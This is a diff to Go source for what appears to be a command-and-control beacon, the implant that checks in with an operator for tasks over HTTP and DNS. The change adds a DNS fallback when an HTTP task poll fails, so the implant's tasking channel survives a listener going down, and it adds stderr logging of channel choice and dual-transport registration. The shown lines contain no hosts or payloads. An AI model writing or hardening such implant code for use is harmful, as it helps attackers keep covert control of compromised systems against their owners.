@@ -127,7 +127,15 @@ func (b *Beacon) checkIn() (string, error) {
 				timestamp := fmt.Sprintf("%05d", time.Now().Unix()%100000)
 				response, err := b.transport.SendTo(idx, "task", pollData+"|"+timestamp)
 				if err != nil {
-					return "", fmt.Errorf("HTTP poll failed: %v", err)
+					// The chosen listener is down: fall back to DNS for this
+					// check-in rather than losing it.
+					fmt.Fprintf(os.Stderr, "[Beacon] checkin http[%d] failed (%v); falling back to dns\n", idx, err)
+					response, err = b.client.sendPhaseCommand(pollData, pollPhase.PhaseConfig)
+					if err != nil {
+						return "", fmt.Errorf("poll failed on http and dns: %v", err)
+					}
+				} else {
+					fmt.Fprintf(os.Stderr, "[Beacon] checkin via http[%d]\n", idx)
 				}
 				if response == "REREG" {
 					b.regStage.Store(0)
@@ -135,6 +143,7 @@ func (b *Beacon) checkIn() (string, error) {
 				}
 				return response, nil
 			}
+			fmt.Fprintf(os.Stderr, "[Beacon] checkin via dns\n")
 			pollViaDNS = true
 		}
 
@@ -682,6 +691,8 @@ func (b *Beacon) registerDual(checkInData string, regPhase PhaseConfig) bool {
 	if mode := dualModeFromProbes(dnsOK, httpOK); mode != transportDual {
 		b.transport.LatchTo(mode)
 	}
+	fmt.Fprintf(os.Stderr, "[Beacon] dual registration dns=%v http=%v -> mode=%s latched=%v\n",
+		dnsOK, httpOK, b.transport.Mode(), b.transport.Latched())
 	return dnsOK || httpOK
 }
 
